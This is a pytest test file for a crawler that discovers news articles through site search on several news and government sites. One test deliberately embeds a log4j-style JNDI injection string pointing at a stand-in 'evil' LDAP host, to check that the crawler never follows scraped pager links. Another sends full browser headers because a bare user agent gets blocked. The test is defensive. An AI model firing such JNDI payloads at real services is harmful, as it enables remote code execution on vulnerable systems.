"""
backend/discovery/test_site_search.py — tests for SiteSearchStrategy against
synthetic fixtures. No live network is used: requests.Session.get is monkeypatched
per-test. Requires only stdlib + requests + lxml (all present in this environment).

NOTE: there is a separate, older backend/test_site_search.py belonging to the
previous implementation -- this file intentionally lives under backend/discovery/
and is not related to it.
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs

import pytest

from backend.discovery.site_search import SiteSearchStrategy
from backend.discovery.base import DiscoveredURL


class FakeResponse:
    def __init__(self, url: str, status_code: int = 200, content: bytes = b"",
                 headers: Optional[Dict[str, str]] = None, json_data=None):
        self.url = url
        self.status_code = status_code
        self.content = content
        self.headers = headers or {}
        self._json_data = json_data
        self.ok = 200 <= status_code < 400

    def json(self):
        if self._json_data is None:
            raise ValueError("no json configured")
        return self._json_data

    @property
    def text(self):
        return self.content.decode("utf-8", errors="replace")


def _profile(domain: str, **overrides) -> Dict:
    base = {
        "domain": domain,
        "seed_url": f"https://{domain}/",
        "enabled": True,
        "strategy": "search",
        "robots": {"respect": True, "crawl_delay": 0},
        "transport": {"timeout_s": 5, "max_retries": 1},
        "allowed_hosts": None,
        "search": {"supported": True},
        "article_url_patterns": [],
        "listing_url_patterns": [],
    }
    base.update(overrides)
    return base


class FakeSession:
    """Records requested URLs and returns pre-programmed responses in order, or
    via a callback keyed by URL."""

    def __init__(self, responder):
        self.responder = responder
        self.requested: List[str] = []

    def get(self, url, headers=None, timeout=None, **kwargs):
        self.requested.append(url)
        # BROWSER_HEADERS marker check for irrawaddy-style tests.
        self._last_headers = headers
        return self.responder(url, headers)


# ── template substitution + URL encoding ────────────────────────────────────

def test_build_url_encodes_keyword():
    template = "https://example.com/search?q={keyword}&page={page}"
    url = SiteSearchStrategy._build_url(template, "hello world & co", 2)
    assert url is not None
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    assert qs["q"] == ["hello world & co"]
    assert qs["page"] == ["2"]
    # quote_plus turns spaces into '+' before urlencoding by the server-side form,
    # so the raw query string should contain a literal '+' rather than %20.
    assert "+" in url or "%20" not in url


def test_chinadaily_search_end_to_end(monkeypatch):
    profile = _profile(
        "chinadaily.com.cn",
        search={
            "supported": True,
            "url_template": ("https://newssearch.chinadaily.com.cn/rest/en/search"
                              "?query={keyword}&size=20&sort=dp&page={page}"),
        },
    )
    strat = SiteSearchStrategy(profile)

    def responder(url, headers):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        assert qs["query"] == ["China"]
        page = int(qs.get("page", ["0"])[0])
        if page == 0:
            data = {"content": [
                {"url": "https://www.chinadaily.com.cn/a/202608/01/WSabc123.html",
                 "title": "Story One", "publishTime": 1785600000000},
            ]}
            return FakeResponse(url, 200, json_data=data)
        return FakeResponse(url, 200, json_data={"content": []})

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)

    result = strat.discover(keyword="China", max_urls=10)
    assert not result.errors
    assert len(result.urls) == 1
    du = result.urls[0]
    assert du.url == "https://www.chinadaily.com.cn/a/202608/01/WSabc123.html"
    assert du.title == "Story One"
    assert du.published_at is not None
    assert du.published_at.tzinfo is not None


# ── repeated-page pagination stop ───────────────────────────────────────────

def test_repeated_page_stops_pagination(monkeypatch):
    profile = _profile(
        "elevenmyanmar.com",
        search={
            "supported": True,
            "url_template": "https://elevenmyanmar.com/search/node/{keyword}?page={page}",
        },
        article_url_patterns=[r"^https://elevenmyanmar\.com/news/[a-z0-9-]{5,}$"],
    )
    strat = SiteSearchStrategy(profile)

    html_page = (
        b'<html><body>'
        b'<a href="/news/story-one">Story One</a>'
        b'<a href="/news/story-two">Story Two</a>'
        b'</body></html>'
    )

    call_count = {"n": 0}

    def responder(url, headers):
        call_count["n"] += 1
        return FakeResponse(url, 200, content=html_page)

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)

    result = strat.discover(keyword="Myanmar", max_urls=100)
    assert not result.errors
    # Page 0 yields 2 URLs; page 1 repeats the same links and must stop the walk.
    assert len(result.urls) == 2
    assert call_count["n"] == 2  # page 0, then page 1 which triggers the stop


def test_elevenmyanmar_pager_urls_are_constructed_not_scraped(monkeypatch):
    """The pager <a href> values on elevenmyanmar reflect injected query strings
    (log4j-style payload found during profiling). Verify we never dereference a
    scraped pager href -- only the constructed template URL is ever requested."""
    profile = _profile(
        "elevenmyanmar.com",
        search={
            "supported": True,
            "url_template": "https://elevenmyanmar.com/search/node/{keyword}?page={page}",
        },
        article_url_patterns=[r"^https://elevenmyanmar\.com/news/[a-z0-9-]{5,}$"],
    )
    strat = SiteSearchStrategy(profile)

    malicious_pager_href = "/search/node/x?page=1&x=${jndi:ldap://evil/a}"
    html_page = (
        b'<html><body>'
        b'<a href="/news/story-one">Story One</a>'
        + malicious_pager_href.encode() +  # not a real <a>, just proving it's inert
        b'<a href="' + malicious_pager_href.encode() + b'">next</a>'
        b'</body></html>'
    )

    requested_urls = []

    def responder(url, headers):
        requested_urls.append(url)
        return FakeResponse(url, 200, content=html_page if "page=0" in url or "page=1" in url
                             else b'<html><body></body></html>')

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)

    strat.discover(keyword="x", max_urls=100)
    assert all("jndi" not in u for u in requested_urls)
    assert all(u.startswith("https://elevenmyanmar.com/search/node/x?page=") for u in requested_urls)


# ── ifa.gov.np decoy-search behaviour ────────────────────────────────────────

def test_ifa_decoy_homepage_never_queried(monkeypatch):
    profile = _profile(
        "ifa.gov.np",
        search={
            "supported": True,
            "url_template": "https://ifa.gov.np/en/publications/?q={keyword}",
        },
        article_url_patterns=[
            r"^https://ifa\.gov\.np/en/news/[A-Za-z0-9-]+/$",
            r"^https://ifa\.gov\.np/en/publications/[A-Za-z0-9-]+/$",
        ],
    )
    strat = SiteSearchStrategy(profile)

    pub_page = (
        b'<html><body>'
        b'<a href="/en/publications/report-one/">Report One</a>'
        b'</body></html>'
    )
    news_page = (
        b'<html><body>'
        b'<a href="/en/news/notice-one/">Notice One</a>'
        b'</body></html>'
    )

    requested = []

    def responder(url, headers):
        requested.append(url)
        # page 1 has no &page= param appended (see _build_ifa_url); only page>=2
        # carries an explicit page=N.
        is_first_page = "page=" not in url
        if "/en/publications/" in url:
            return FakeResponse(url, 200, content=pub_page if is_first_page else b"<html></html>")
        if "/en/news/" in url:
            return FakeResponse(url, 200, content=news_page if is_first_page else b"<html></html>")
        return FakeResponse(url, 200, content=b"<html></html>")

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)

    result = strat.discover(keyword="Nepal", max_urls=50)
    assert not result.errors
    # Never queries the decoy homepage search form (/en/?q=).
    assert not any(u.rstrip("/").endswith("/en") or "/en/?q=" in u for u in requested)
    urls = {du.url for du in result.urls}
    assert "https://ifa.gov.np/en/publications/report-one/" in urls
    assert "https://ifa.gov.np/en/news/notice-one/" in urls


# ── full-header usage for irrawaddy ──────────────────────────────────────────

def test_irrawaddy_uses_full_browser_headers(monkeypatch):
    profile = _profile(
        "irrawaddy.com",
        seed_url="https://burma.irrawaddy.com/",
        search={
            "supported": True,
            "url_template": "https://burma.irrawaddy.com/?s={keyword}&paged={page}",
        },
        allowed_hosts=["burma.irrawaddy.com"],
        article_url_patterns=[r"^https://burma\.irrawaddy\.com/.+/\d{4}/\d{2}/\d{2}/.+\.html$"],
        robots={"respect": True, "crawl_delay": 10.0},
    )
    strat = SiteSearchStrategy(profile)
    assert strat.crawl_delay() == 10.0

    captured_headers = []

    def responder(url, headers):
        captured_headers.append(headers)
        return FakeResponse(url, 403 if "User-Agent" not in (headers or {}) else 200,
                             content=b"<html><body></body></html>")

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)
    monkeypatch.setattr("backend.discovery.site_search.time.sleep", lambda s: None)

    strat.discover(keyword="Myanmar", max_urls=10)
    assert captured_headers, "expected at least one request"
    for h in captured_headers:
        # Full browser header set required (verified: bare UA alone -> 403).
        assert "User-Agent" in h
        assert "Accept" in h
        assert "Sec-Fetch-Mode" in h
        assert "Sec-Fetch-Dest" in h


def test_globaltimes_scopes_by_date_range_not_sort(monkeypatch):
    profile = _profile(
        "globaltimes.cn",
        search={
            "supported": True,
            "url_template": ("https://search.globaltimes.cn/SearchCtrl?tempkey={keyword}"
                              "&page_no={page}&begin_date={YYYY-MM-DD}&end_date={YYYY-MM-DD}"),
        },
    )
    strat = SiteSearchStrategy(profile)

    requested = []

    def responder(url, headers):
        requested.append(url)
        return FakeResponse(url, 200, content=b"<html><body></body></html>")

    fake_session = FakeSession(responder)
    monkeypatch.setattr("backend.discovery.site_search.requests.Session",
                         lambda: fake_session)
    monkeypatch.setattr("backend.discovery.site_search.time.sleep", lambda s: None)

    strat.discover(keyword="China", max_urls=10)
    assert requested
    url = requested[0]
    assert "{YYYY-MM-DD}" not in url
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    assert "begin_date" in qs and "end_date" in qs
    assert qs["begin_date"][0] != qs["end_date"][0]


def test_no_keyword_records_error_and_does_not_raise():
    profile = _profile("chinadaily.com.cn", search={"supported": True,
                                                      "url_template": "https://x/?q={keyword}&page={page}"})
    strat = SiteSearchStrategy(profile)
    result = strat.discover(keyword=None, max_urls=10)
    assert result.urls == []
    assert result.errors


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-v"]))
